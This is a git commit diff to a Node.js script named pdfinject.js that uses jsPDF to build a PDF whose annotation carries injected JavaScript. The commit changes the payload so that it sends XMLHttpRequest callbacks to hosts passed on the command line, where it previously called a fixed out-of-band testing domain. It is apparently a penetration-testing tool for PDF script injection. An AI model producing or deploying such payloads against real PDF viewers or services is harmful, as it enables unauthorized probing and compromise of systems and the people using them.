75d0a6e74c6bd60c8d3515fedb8d2222624eb773
649abhinav <74678458+649abhinav@users.noreply.github.com>
2025-03-24 03:30:05 +0530

    Update pdfinject.js

--- pdfinject.js
+++ pdfinject.js
@@ -2,16 +2,17 @@ const { jsPDF } = require('jspdf');
 
 const doc = new jsPDF();
 
-const tobeEXEC = `
+const {argv} = require('node:process');
+const tobeEXEC= argv.slice(2).map((val) =>`
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'http://{collaborator}.oast.fun', true);
+    xhr.open('GET', 'http://${val}', true);
     xhr.onreadystatechange = function () {
         if (xhr.readyState == 4 && xhr.status == 200) {
             console.log(xhr.responseText);
         }
     };
     xhr.send();
-`;
+`).join("\n");
 
 doc.createAnnotation({
   bounds: { x: 0, y: 10, w: 200, h: 200 },
